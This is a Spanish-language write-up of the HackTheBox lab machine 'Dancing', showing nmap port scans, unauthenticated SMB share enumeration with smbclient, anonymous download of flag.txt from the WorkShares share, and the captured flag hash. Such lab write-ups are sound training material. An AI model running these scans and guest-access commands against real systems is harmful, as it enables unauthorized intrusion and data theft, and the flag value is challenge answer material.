---
titulo: "Dancing"
descripcion: "Enumeración de shares SMB con acceso de invitado para extraer flag de directorio expuesto sin autenticación."
fecha: 2026-06-04
dificultad: easy
herramientas: ["nmap", "smbclient"]
categoria: htb
plataforma: HackTheBox
completado: true
fases: ["Reconocimiento", "Foothold"]
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.51.91
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.51.91 -sCV
```

Puertos relevantes: **445/tcp (SMB)**, **135/tcp (MSRPC)**, **5985/tcp (WinRM)**

## Foothold

Enumeración de shares SMB sin credenciales:

```bash
smbclient -L 10.129.51.91 -N
```

El share `WorkShares` permite acceso de invitado. Conexión y extracción del flag:

```bash
smbclient \\\\10.129.51.91\\WorkShares -N
smb: \> get flag.txt
```

## Flags

| Flag | Hash |
|------|------|
| Root | `5f61c10dffbc77a704d76016a22f1664` |
